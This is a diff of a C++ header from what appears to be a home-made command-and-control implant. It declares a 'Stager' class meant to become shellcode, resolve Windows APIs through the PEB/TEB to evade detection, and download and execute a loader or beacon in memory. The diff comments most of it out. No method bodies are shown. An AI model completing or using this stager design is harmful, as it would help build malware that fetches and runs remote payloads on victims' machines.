@@ -12,26 +12,27 @@ stager will probs have to be an exe cuz i only know how to turn .exe into shell 
 #include "../utils/utils.h"
 #include "../utils/kernel32_util.h"
 
-#include <string> // TODO: done use string later on as it imports a lot of unneeded stuff
+//#include <string> // TODO: done use string later on as it imports a lot of unneeded stuff
 
 //#define WIN32_LEAN_AND_MEAN // reduces stuff imported from header
 //#include <windows.h>
 //#undef WIN32_LEAN_AND_MEAN
-#include <iostream>
 
-#include <vector>
+//#include <vector>
 
 
 
 #include <ws2tcpip.h> // needed by getaddrinfo
 // #include <winhttp.h> uncomment when implmenting https c2
 
+/*
 class Stager
 {
 public:
     Stager() {};
     //~Stager();
-    bool run(const std::string& host, const std::string& port);
+    //bool run(const std::string& host, const std::string& port);
+    bool run(const char* host, const char* port);
 private:
     // Manually resolve API via PEB/TEB
     void resolveAPIs();
@@ -39,4 +40,4 @@ private:
     void allocateMemoryForLoader(); // or beacon
     void downloadLoader();
     void executeLoader(); // jump to location in memory where we downloaded it too
-};
+};*/
